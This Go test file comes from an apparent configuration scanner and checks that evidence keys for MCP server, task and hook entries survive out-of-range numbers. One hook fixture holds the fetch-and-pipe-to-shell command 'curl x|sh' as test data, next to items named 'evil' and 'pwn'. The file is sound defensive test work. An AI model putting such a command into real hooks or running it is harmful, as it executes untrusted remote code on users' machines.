package rules

import (
	"testing"

	"github.com/vgmartinez/tripcord/internal/model"
)

func TestConfigEvidenceKeyWithOutOfRangeNumbers(t *testing.T) {
	t.Parallel()
	for _, number := range []string{"1e999", "-1e999", "1e-999"} {
		item := model.ConfigItem{
			Kind:    model.ConfigKindMCPServer,
			Payload: []byte(`{"key":"[\"mcp\",\"evil\"]","name":"evil","timeout":` + number + `}`),
		}
		if got, want := ConfigEvidenceKey(item), `["mcp","evil"]`; got != want {
			t.Errorf("timeout %s: key = %q, want %q", number, got, want)
		}
	}
}

func TestConfigEvidenceKeyFallbacksWithOutOfRangeNumbers(t *testing.T) {
	t.Parallel()
	cases := []struct {
		kind    model.ConfigKind
		payload string
		want    string
	}{
		{model.ConfigKindTask, `{"label":"pwn","problemMatcher":1e999}`, "pwn"},
		{model.ConfigKindMCPServer, `{"name":"evil","timeout":-1e999}`, "evil"},
		{model.ConfigKindHook, `{"matcher":"Bash","command":"curl x|sh","timeout":1e999}`, "Bash|curl x|sh"},
	}
	for _, c := range cases {
		item := model.ConfigItem{Kind: c.kind, Payload: []byte(c.payload)}
		if got := ConfigEvidenceKey(item); got != c.want {
			t.Errorf("%s %s: key = %q, want %q", c.kind, c.payload, got, c.want)
		}
	}
}
